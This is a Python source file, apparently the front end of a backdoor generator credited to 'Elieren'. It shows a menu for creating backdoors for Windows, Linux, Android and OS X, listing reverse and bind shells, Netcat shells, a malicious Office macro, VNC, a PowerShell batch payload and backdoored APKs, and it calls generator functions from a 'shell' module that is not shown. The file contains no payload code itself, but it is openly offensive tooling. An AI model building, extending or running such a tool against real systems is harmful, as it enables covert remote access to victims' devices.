import colorama
from colorama import Fore, Style
import os
from shell import *

try:
    os.system('clear')
    banner = '''
    ██▒   █▓ ██▓ ██▀███   ▄████▄   ██▀███ ▓██   ██▓
    ▓██░   █▒▓██▒▓██ ▒ ██▒▒██▀ ▀█  ▓██ ▒ ██▒▒██  ██▒
    ▓██  █▒░▒██▒▓██ ░▄█ ▒▒▓█    ▄ ▓██ ░▄█ ▒ ▒██ ██░
    ▒██ █░░░██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒██▀▀█▄   ░ ▐██▓░
    ▒▀█░  ░██░░██▓ ▒██▒▒ ▓███▀ ░░██▓ ▒██▒ ░ ██▒▓░
    ░ ▐░  ░▓  ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░ ▒▓ ░▒▓░  ██▒▒▒ 
    ░ ░░   ▒ ░  ░▒ ░ ▒░  ░  ▒     ░▒ ░ ▒░▓██ ░▒░ 
        ░░   ▒ ░  ░░   ░ ░          ░░   ░ ▒ ▒ ░░  
        ░   ░     ░     ░ ░         ░     ░ ░     
        ░                ░                 ░ ░     
                                        by Elieren
    '''
    
    while True:
        print(Fore.GREEN + banner + Fore.YELLOW)
        print(Fore.YELLOW + 'Create backdoor for:')
        print()
        print('1) Windows')
        print('2) linux')
        print('3) Android')
        print('4) OS X')
    
        platform = str(input(': '))

        if platform == '1':
            print('[1] Bind Shell')
            print('[2] Reverse Shell')
            print('[3] Reverse HTTPS')
            print('[4] Bind Shell (Netcat)')
            print('[5] Reverse Shell (Netcat)')
            print('[6] Microsoft macro')
            print('[7] Vnc')
            print('[8] PowerShell (bat)')
            print('[0] Exit')
            nam = int(input(': '))
            if nam != 0:
                windows(nam)
                break
            else:
                pass

        elif platform == '2':
            print('[1] Reverse Shell (elf)')
            print('[2] Reverse Shell (Python)')
            print('[3] Bind Shell (elf)')
            print('[0] Exit')
            nam = int(input(': '))
            if nam != 0:
                linux(nam)
                break
            else:
                pass

        elif platform == '3':
            print('[1] Create apk')
            print('[2] Backdoor apk original (gui)')
            print('[0] Exit')
            nam = int(input(': '))
            if nam != 0:
                android(nam)
                break
            else:
                pass

        elif platform == '4':
            print('[1] Reverse Shell')
            print('[2] Bind Shell')
            print('[0] Exit')
            nam = int(input(': '))
            if nam != 0:
                mac(nam)
                break
            else:
                pass
        
        else:
            pass
        os.system('clear')

except:
    print('Good bye.')